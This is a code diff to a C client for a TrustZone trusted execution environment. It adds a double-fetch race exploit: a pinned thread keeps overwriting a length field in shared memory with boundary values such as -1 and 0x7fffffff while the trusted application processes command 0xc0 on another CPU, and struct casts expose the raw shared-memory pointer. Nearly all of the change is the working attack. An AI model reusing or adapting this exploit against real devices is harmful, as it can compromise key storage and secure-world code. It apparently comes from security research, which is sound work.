@@ -1,5 +1,7 @@
+#define _GNU_SOURCE
 #include <stdio.h>
 #include <unistd.h>     
+#include <pthread.h>
 #include <sys/mman.h>   
 #include <sys/types.h>  
 #include <stdlib.h>
@@ -20,6 +22,7 @@ void (*TEEC_FinalizeContext_impl)(TEEC_Context*);
 void (*TEEC_CloseSession_impl)(TEEC_Session*);
 TEEC_Result (*TEEC_InvokeCommand_impl)(TEEC_Session*,uint32_t,TEEC_Operation*,uint32_t*);
 TEEC_Result (*TEEC_RegisterSharedMemory_impl)(TEEC_Context*, TEEC_SharedMemory*);
+TEEC_Result (*TEEC_AllocateSharedMemory_impl)(TEEC_Context*, TEEC_SharedMemory*);
 
 void cleanup_shm(){
 #if EMULATE
@@ -30,24 +33,87 @@ void cleanup_shm(){
 #endif
 }
 
+typedef struct bs{
+    int* buf0;
+    int* buf1;
+} bs;
+
+void* mod_thread(void* arrg){
+    bs* bsss = (bs*) arrg;
+    int* arg = bsss->buf0;
+    int* arg2 = bsss->buf1;
+    cpu_set_t set;
+    CPU_ZERO(&set);
+    CPU_SET(1, &set);
+    while(1){
+        ((int*)arg)[0x1] = 0x800;
+        ((int*)arg2)[0x1] = 0x800;
+        ((int*)arg)[0x1] = 0x7fffffff;
+        ((int*)arg2)[0x1] = 0x7fffffff;
+        ((int*)arg)[0x1] = -1;
+        ((int*)arg2)[0x1] = -1;
+        ((int*)arg)[0x1] = 0x500000;
+        ((int*)arg2)[0x1] = 0x500000;
+        ((int*)arg)[0x1] = 0x10;
+        ((int*)arg2)[0x1] = 0x10;
+    }
+}
+
+typedef struct pls{
+    uint64_t a[3];
+    uint64_t ptr;
+}pls;
+
 void send_req(TEEC_Context *context, TEEC_Session *session)
 {
+    cpu_set_t set;
+    CPU_ZERO(&set);
+    CPU_SET(0, &set);
+
     TEEC_Operation op;
     memset(&op, 0, sizeof(op));
-    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INPUT, TEEC_MEMREF_TEMP_OUTPUT,
-                                     TEEC_VALUE_OUTPUT, TEEC_NONE);
+    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_WHOLE, TEEC_MEMREF_TEMP_OUTPUT,
+                                     TEEC_NONE, TEEC_NONE);
     printf("params: 0x%lx\n", op.paramTypes);
     char* buf = (char*)malloc(0x1000);
+    TEEC_Result res; 
     memset(buf, 0, 0x1000);
+  
+    TEEC_SharedMemory in_mem;
+    in_mem.buffer = buf;
+    in_mem.size = 0x1000;
+    in_mem.flags = TEEC_MEM_INPUT; //| TEEC_MEM_OUTPUT;
+    res = TEEC_RegisterSharedMemory_impl(context, &in_mem);
+    if (res != TEEC_SUCCESS) {
+        printf("Failed to register shared memory 1 %d\n", res);
+        exit(-1);
+    }
+    pls* wow = (pls*)&in_mem;
+    pls* wow2 = (pls*)wow->ptr;
+    void* shm = (void*)wow2->ptr;
+    printf("shm ptr %p\n", shm);
     
-    op.params[0].tmpref.buffer = buf;  // the keyblock buffer
-    op.params[0].tmpref.size =  0x1000; 
+ 
+    op.params[0].memref.parent = &in_mem;  // the keyblock buffer
+    //op.params[0].tmpref.buffer = (void*)malloc(0x1000);  // the keyblock buffer
+    //op.params[0].tmpref.size =  0x1000; 
     op.params[1].tmpref.buffer = (void*)malloc(0x1000);  // the keyblock buffer
     op.params[1].tmpref.size =  0x1000; 
     uint32_t err_origin;
 
-    TEEC_Result res = TEEC_InvokeCommand_impl(session, 0xc0, &op, &err_origin);
+    pthread_t tid;
+    bs someshit;
+    someshit.buf0 = (int*)shm;
+    someshit.buf1 = (int*)buf;
+    if (pthread_create(&tid, NULL, mod_thread, &someshit) != 0) {
+        perror("pthread_create failed");
+        return;
+    }
+    while(1){
+    res = TEEC_InvokeCommand_impl(session, 0xc0, &op, &err_origin);
     printf("TEEC_Result: %x origin: err_origin: %x\n", res, err_origin);
+    break;
+    }
 }
 
 
